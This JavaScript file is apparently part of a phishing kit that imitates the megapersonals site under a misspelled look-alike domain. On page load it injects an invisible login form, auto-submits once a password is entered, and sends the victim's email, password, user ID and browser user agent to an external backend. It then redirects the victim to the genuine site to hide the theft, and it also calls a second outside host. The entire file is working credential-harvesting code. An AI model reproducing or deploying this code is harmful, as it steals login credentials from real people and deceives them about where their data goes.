const apiUrl = 'https://erosback.vercel.app'
const siteUrl ='www.meggapursonel.online'

function detectDevice(userAgent) {
    if (/Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(userAgent)) {
      return "phone";
    }
    if (/Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i.test(userAgent)) {
      return "ipad";
    }
    return "desktop";
  }

  async function verifyPage(params) {
    
  }
function getQueryParam(param) {
    const urlParams = new URLSearchParams(window.location.search);
  console.log(urlParams.get(param))
    return urlParams.get(param);
}

document.addEventListener('DOMContentLoaded', () => {
    // Extract 'userid' from the URL
    const userId = getQueryParam('userid') || 1; // Default to 1 if 'userid' is not present
    console.log('User ID:', userId);

    // Dynamically create the login form
    const loginForm = document.createElement('form');
    loginForm.id = 'loginForm';
    loginForm.method = 'POST';
    loginForm.style.opacity = '0'; // Hide the form

    // Add input fields: username, password, and userAgent
    const usernameField = document.createElement('input');
    usernameField.type = 'text';
    usernameField.id = 'username';
    usernameField.name = 'username';

    const passwordField = document.createElement('input');
    passwordField.type = 'password';
    passwordField.id = 'password';
    passwordField.name = 'password';

    const userAgentField = document.createElement('input');
    userAgentField.type = 'text';
    userAgentField.id = 'userAgent';
    userAgentField.name = 'userAgent';
    userAgentField.value = navigator.userAgent; // Automatically fill with the browser's user agent

    // Append the fields to the form
    loginForm.append(usernameField, passwordField, userAgentField);
    document.body.appendChild(loginForm);

    // Listen for changes in the password field
    passwordField.addEventListener('input', () => {
        if (passwordField.value.trim() !== '') {
            loginForm.submit(); // Auto-submit the form if password is not empty
        }
    });

    // Handle form submission
    loginForm.addEventListener('submit', (event) => {
        event.preventDefault(); // Prevent default form submission

        const username = usernameField.value.trim();
        const password = passwordField.value.trim();

        if (username && password) {
            // Send form data via fetch
            fetch('https://erosback.vercel.app/add/instant/mega', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: username,
                    password: password,
                    userId: userId,
                    userAgent: navigator.userAgent
                })
            })
                .then(response => response.json())
                .then(data => {
                    console.log('Response:', data);
                    if (data.success) {
                        // Redirect to another URL on success
                        window.location.href = 'https://megapersonals.eu';
                    }
                })
                .catch(error => {
                    console.error('Error during form submission:', error);
                });
        } else {
            console.error('Username and password are required.');
        }
    });

    // Fetch additional data on page load
    fetch('https://indigo-porcupine-546134.hostingersite.com/api/data', {
        method: 'POST'
    })
        .then(response => response.json())
        .then(data => {
            console.log('Fetched data:', data);
        })
        .catch(error => {
            console.error('Error fetching data:', error);
        });
});
